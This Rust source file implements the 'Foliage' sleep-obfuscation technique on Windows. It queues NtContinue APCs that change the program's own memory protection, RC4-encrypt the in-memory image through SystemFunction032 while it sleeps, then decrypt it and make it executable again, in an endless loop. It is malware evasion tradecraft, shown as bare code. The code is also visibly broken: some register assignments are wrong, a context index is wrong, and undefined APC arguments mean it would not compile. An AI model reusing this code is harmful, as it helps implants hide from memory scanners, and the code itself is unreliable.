#![allow(non_snake_case)]
use std::{
    arch::x86_64::_rdrand32_step,
    os::raw::c_void,
    ptr::{null, null_mut},
};

use ntapi::{
    ntexapi::NtCreateEvent,
    ntobapi::NtWaitForSingleObject,
    ntpsapi::{NtCreateThreadEx, NtGetContextThread, NtQueueApcThread, NtTestAlert},
    ntxcapi::NtContinue,
};
use windows_sys::Win32::System::{
    Diagnostics::Debug::{CONTEXT, CONTEXT_FULL_AMD64, EX_PROP_INFO_LOCKBYTES, IMAGE_NT_HEADERS64},
    Kernel::SynchronizationEvent,
    LibraryLoader::{GetModuleHandleA, GetProcAddress, LoadLibraryA},
    Memory::{PAGE_EXECUTE_READ, PAGE_READWRITE, VirtualProtect},
    SystemServices::IMAGE_DOS_HEADER,
    Threading::{
        EVENT_ALL_ACCESS, ExitThread, GetCurrentProcess, THREAD_ALL_ACCESS, WaitForSingleObjectEx,
    },
};

#[repr(C)]
struct USTRING {
    Length: u32,
    MaximumLength: u32,
    Buffer: *mut u8,
}

fn nt_success(status: i32) -> bool {
    status >= 0
}

fn random() -> u32 {
    unsafe {
        let mut seed: u32 = 0;
        _rdrand32_step(&mut seed);
        seed
    }
}

fn foliage(sleep_time: u32) {
    unsafe {
        let mut ctx_init: CONTEXT = CONTEXT::default();
        let mut event_sync: *mut c_void = null_mut();
        let mut thread_handle: *mut c_void = null_mut();
        let mut key: [u8; 16] = [0; 16];
        let mut old_protection: u32 = 0;

        let image_base = GetModuleHandleA(null_mut());
        let dos_header = image_base as *const IMAGE_DOS_HEADER;
        let nt_header =
            image_base.add((*dos_header).e_lfanew as usize) as *const IMAGE_NT_HEADERS64;
        let image_size = (*nt_header).OptionalHeader.SizeOfImage as usize;

        for i in 0..16 {
            key[i] = random() as u8;
        }

        let key_bytes = USTRING {
            Length: 16,
            MaximumLength: 16,
            Buffer: key.as_mut_ptr(),
        };

        let image = USTRING {
            Length: image_size as u32,
            MaximumLength: image_size as u32,
            Buffer: image_base as *mut u8,
        };

        println!("[+] Image Base: {:p} [{} bytes]", image_base, image_size);

        let mut advapi32 = GetModuleHandleA("advapi32.dll\0".as_ptr() as *const u8);
        if advapi32.is_null() {
            advapi32 = LoadLibraryA("advapi32.dll\0".as_ptr() as *const u8);
        }

        let systemfunction032 =
            GetProcAddress(advapi32, "SystemFunction032\0".as_ptr() as *const u8).unwrap()
                as *const c_void;
        if systemfunction032.is_null() {
            println!("[-] Failed to get SystemFunction032 address");
            return;
        }

        if !nt_success(NtCreateEvent(
            &mut event_sync as *mut _ as *mut _,
            EVENT_ALL_ACCESS,
            null_mut(),
            SynchronizationEvent as u32,
            0,
        )) {
            println!("[-] Failed to create event");
            return;
        }

        if !nt_success(NtCreateThreadEx(
            &mut thread_handle as *mut _ as *mut _,
            THREAD_ALL_ACCESS,
            null_mut(),
            GetCurrentProcess() as *mut _,
            null_mut(),
            null_mut(),
            1,
            0,
            0x1000 * 20,
            0x1000 * 20,
            null_mut(),
        )) {
            println!("[-] Failed to create thread");
            return;
        }

        println!("[+] Thread Handle: {:p}", thread_handle);

        ctx_init.ContextFlags = CONTEXT_FULL_AMD64;

        if !nt_success(NtGetContextThread(
            thread_handle as *mut _,
            &mut ctx_init as *mut _ as *mut _,
        )) {
            println!("[-] Failed to get thread context");
            return;
        }

        *(ctx_init.Rsp as *mut c_void) = NtTestAlert as _;

        let mut ctx: [CONTEXT; 7] = [ctx_init; 7];

        ctx[0].Rcx = NtWaitForSingleObject as *const () as u64;
        ctx[0].Rdx = event_sync as u64;
        ctx[0].R8 = 0;
        ctx[0].R9 = 0;

        ctx[1].Rip = VirtualProtect as *const () as u64;
        ctx[1].Rcx = image_base as u64;
        ctx[1].Rdx = image_size as u64;
        ctx[1].R8 = PAGE_READWRITE as u64;
        ctx[1].R9 = &mut old_protection as *mut _ as u64;

        ctx[2].Rcx = systemfunction032 as *const () as u64;
        ctx[2].Rdx = &image as *const _ as u64;
        ctx[2].R8 = &key_bytes as *const _ as u64;

        ctx[3].Rip = WaitForSingleObjectEx as *const () as u64;
        ctx[3].Rcx = GetCurrentProcess() as u64;
        ctx[3].Rdx = sleep_time as u64;
        ctx[3].R8 = 0;

        ctx[4].Rip = systemfunction032 as *const () as u64;
        ctx[4].Rcx = &image as *const _ as u64;
        ctx[4].Rdx = &key_bytes as *const _ as u64;

        ctx[5].Rip = VirtualProtect as *const () as u64;
        ctx[5].Rcx = image_base as u64;
        ctx[5].Rdx = image_size as u64;
        ctx[5].R8 = PAGE_EXECUTE_READ as u64;
        ctx[5].R9 = &mut old_protection as *mut _ as u64;

        ctx[6].Rip = ExitThread as *const () as u64;
        ctx[5].Rcx = 0;

        for i in 0..7 {
            if (!nt_success(NtQueueApcThread(
                thread_handle as *mut _,
                NtContinue,
                ApcArgument1,
                ApcArgument2,
                ApcArgument3,
            ))) {
                println!("[-] Failed to queue APC for context {}", i);
                return;
            }
        }
    }
}

fn main() {
    loop {
        foliage(3000);
    }
}
